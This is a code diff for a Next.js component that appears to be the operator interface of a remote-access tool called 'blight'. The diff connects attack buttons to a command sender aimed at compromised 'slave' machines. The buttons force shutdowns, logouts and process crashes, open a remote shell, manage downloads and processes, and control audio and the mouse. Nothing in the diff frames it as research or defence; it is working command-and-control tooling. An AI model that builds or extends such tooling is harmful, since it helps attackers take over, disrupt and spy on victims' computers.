@@ -1,5 +1,6 @@
 import Link from "next/link";
 import React, { useState, useEffect } from "react";
+import { sendCommand } from "./utils/commandUtils";
 
 interface SlaveData {
   freq: number;
@@ -27,10 +28,10 @@ export function MachineTableItem({ slave }: { slave: SlaveData }) {
     );
 }
 
-export function ModuleItem({ title, link }: { title: string; link: string }) {
+export function ModuleItem({ title, link, onClick }: { title: string; link: string; onClick?: () => void }) {
     return (
         <div className="mt-1 p-2 bg-neutral-800 rounded-lg text-white hover:text-lime-500">
-        <Link href={link} >
+        <Link href={link} onClick={onClick}>
             {title}
         </Link>
         </div>
@@ -38,14 +39,28 @@ export function ModuleItem({ title, link }: { title: string; link: string }) {
 }
 
 export function AttackModules({ slave }: { slave: SlaveData }) {
-    return (
+  const [output, setOutput] = useState<string | null>(null);
+  const handleClick = (command: string) => {
+    sendCommand(slave.slaveName, command, setOutput);
+  }  
+  return (
+      
+
+        <div>
         <div className="mt-2 rounded-lg text-white">
             <ModuleItem title="Download Manager" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=download_file`} />
             <ModuleItem title="Process Manager" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=process_manager`} />
-            <ModuleItem title="Force Shutdown" link="#" />
-            <ModuleItem title="Force Logout" link="#" />
-            <ModuleItem title="Force Crash Non-Critical Processes" link="#" />
+            <ModuleItem title="Force Shutdown" link="#" onClick={()=> handleClick("force_shutdown")} />
+            <ModuleItem title="Force Logout" link="#" onClick={()=> handleClick("force_logout")} />
+            <ModuleItem title="Force Crash Non-Critical Processes" link="#" onClick={()=> handleClick("force_crash")}  />
             <ModuleItem title="Force Crash Critical Processes" link="#" />
+            <ModuleItem title="Drop Into Shell" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=shell`}/>
+            <ModuleItem title="Audio Player" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=audio_player`}/>
+            <ModuleItem title="Mouse" link={`/blight/attack-stage?slaveName=${slave.slaveName}&attack=mouse`} />
+            
+        
+        </div>
+        {output && <div className="mt-2 p-2 bg-neutral-800 rounded-lg text-white">{output}</div>}
         </div>
     );
 }
